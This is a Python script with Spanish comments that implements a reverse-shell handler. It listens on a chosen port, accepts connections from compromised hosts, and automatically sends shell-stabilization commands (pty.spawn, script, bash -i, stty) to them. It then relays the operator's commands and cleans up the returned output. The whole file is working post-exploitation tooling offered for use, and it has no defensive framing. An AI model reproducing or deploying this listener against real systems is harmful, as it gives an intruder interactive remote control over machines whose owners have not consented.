#!/usr/bin/env python3
import socket
import threading
import os
import sys
import select
import re
import time

# Expresión regular para limpiar la salida
ansi_escape = re.compile(rb'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
control_chars = re.compile(rb'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]')

def clean_output(data):
    data = ansi_escape.sub(b'', data)
    data = control_chars.sub(b'', data)
    return data.decode('utf-8', errors='ignore').strip()

def stabilize_shell(client):
    # Intentar diferentes versiones de estabilización
    stabilization_commands = [
        # Python options (si están disponibles)
        b'python -c "import pty; pty.spawn(\'/bin/bash\')"\n',
        b'python3 -c "import pty; pty.spawn(\'/bin/bash\')"\n',
        # Non-Python options
        b'script -qc /bin/bash /dev/null\n',
        b'/bin/bash -i\n'
    ]
    
    # Enviar comandos de estabilización
    for cmd in stabilization_commands:
        client.send(cmd)
        time.sleep(0.5)
    
    # Configurar entorno terminal
    client.send(b'export TERM=xterm\n')
    client.send(b'stty rows 40 columns 180\n')
    
    # Intentar desactivar el eco
    client.send(b'stty -echo\n')
    time.sleep(1)

def handler(client, address, port):
    os.system('clear')
    print(f"[*] Escuchando en 0.0.0.0:{port}...\n")
    print(f"\n[+] Conexión de {address[0]}:{address[1]}")
    print("[*] Shell activa\n")
    
    # Automatizar estabilización
    stabilize_shell(client)
    
    # Variable para almacenar el último comando enviado
    last_command = ""
    
    try:
        while True:
            sockets = [client, sys.stdin]
            read_sockets, _, _ = select.select(sockets, [], [])
            
            for sock in read_sockets:
                if sock == client:
                    data = client.recv(4096)
                    if not data:
                        print("\n[!] Cliente desconectado.")
                        return
                    
                    # Limpiar la salida
                    output = clean_output(data)
                    
                    # Eliminar el eco del comando
                    if last_command and last_command in output:
                        output = output.replace(last_command, "", 1)
                    
                    # Eliminar espacios en blanco
                    output = output.strip()
                    
                    if output:  # Solo imprimir si hay contenido
                        print(output, flush=True)
                else:
                    cmd = sys.stdin.readline()
                    last_command = cmd.strip()
                    client.send(cmd.encode())
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")
    finally:
        client.close()

def start_server(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    print(f"[*] Escuchando en 0.0.0.0:{port}...\n")
    try:
        while True:
            client, addr = server.accept()
            thread = threading.Thread(target=handler, args=(client, addr, port))
            thread.start()
    except KeyboardInterrupt:
        print("\n[!] Cerrando servidor.")
    finally:
        server.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <puerto>")
        sys.exit(1)
    try:
        port = int(sys.argv[1])
        start_server(port)
    except ValueError:
        print("[!] El puerto debe ser un número.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Servidor detenido.")
        sys.exit(0)
